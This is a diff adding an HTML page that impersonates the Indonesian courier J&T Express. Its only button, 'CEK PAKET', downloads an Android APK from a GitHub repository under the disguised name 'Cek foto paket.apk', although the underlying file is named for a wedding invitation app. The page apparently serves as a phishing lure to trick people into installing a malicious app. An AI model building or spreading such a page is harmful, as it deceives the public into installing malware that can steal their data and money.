@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>J&T Express Indonesia jet.com</title>
+
+  <style>
+    body, html {
+      overflow-x: hidden; /* Prevent horizontal scrolling */
+      height: 100%;
+      margin: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      min-height: 100%;
+    }
+
+    #header {
+      width: 111%;
+      height: 300px; /* Tinggi gambar */
+      background-image: url('https://i.ibb.co/k10TpRx/IMG-20240105-225507.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex: 1; /* Mempertahankan tinggi 100% container */
+      flex-direction: column; /* Center content vertically */
+    }
+
+    a {
+      text-decoration: none;
+    }
+
+    button {
+      width: calc(140% - 30px);
+      background-color: #8B0000;
+      color: #fff;
+      padding: 13px;
+      border: none;
+      border-radius: 9px;
+      cursor: pointer;
+      margin-top: 10px; /* Jarak 10px dari atas */
+    }
+
+    button:hover {
+      background-color: #red;
+    }
+
+    .button-caption {
+      font-family: 'Roboto', sans-serif;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-bottom: 10px; /* Jarak 10px dari bawah */
+    }
+
+    .marquee-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: -70px;
+    }
+
+    .marquee {
+      overflow: hidden;
+      white-space: nowrap;
+      text-align: center;
+      position: relative;
+    }
+
+    .marquee p {
+      display: inline-block;
+      background-color: white;
+      /* Warna latar belakang tetap hitam */
+      color: black; /* Warna text */
+      padding: 0 10px; /* Padding sesuaikan kebutuhan */
+      animation: marquee 15s linear infinite;
+    }
+
+    @keyframes marquee {
+      0% {
+        transform: translateX(100%);
+      }
+      100% {
+        transform: translateX(-100%);
+      }
+    }
+
+    .invitation-text {
+      text-align: center;
+      margin-top: 20px; /* Jarak 20px dari tombol unduh */
+    }
+
+    .additional-text {
+      font-family: 'Roboto', sans-serif;
+      text-transform: uppercase;
+      margin-top: 10px; /* Jarak 10px dari teks sebelumnya */
+    }
+
+    .smaller-text {
+      font-size: 13px; /* Ukuran teks yang lebih kecil */
+      line-height: 1.3; /* Spasi baris yang sesuai */
+    }
+    #gambar-bawah img {
+  width: 92%;
+  margin-top: 10px;
+  object-fit: cover;
+}
+  </style>
+</head>
+<body>
+
+  <div id="header"></div>
+
+  <div class="container">
+    <div class="marquee-container">
+      <div class="marquee">
+        <p>
+          Pengiriman J&T EZ, J&T ECO, J&T Super, J&T Express- Hadirkan Jaminan Kiriman Premium Lewat J&T Super, Diskon ONGKIR, KIRIM PAKET KE SELURUH INDONESIA
+        </p>
+      </div>
+    </div>
+    <div class="button-caption">J&T Super DI JAMIN LEBIH AMAN</div>
+    <a href="https://github.com/Jtpaket2024/Jtpaket2024.github.io/raw/main/com.weddinginvitation.go.apk" download="Cek foto paket.apk">
+      <button>
+        CEK PAKET
+      </button>
+    </a>
+    <div class="invitation-text">
+      <p class="smaller-text">
+        Kirim Barang Ke Luar Negri Lewat J&T<br>
+        Dengan Aman Mudah Dan Cepat<br>
+        Review Pengiriman J&T Express
+      </p>
+      <div class="additional-text">
+        LAYANAN BARU LEBIH AMAN PREMIUM
+      </div>
+        <div id="gambar-bawah">
+    <img src="https://i.ibb.co/n3Vf9Nx/IMG-20240105-215921-removebg-preview-1.png" alt="Gambar 2711">
+  </div>
+    </div>
+  </div>
+
+</body>
+  </html>
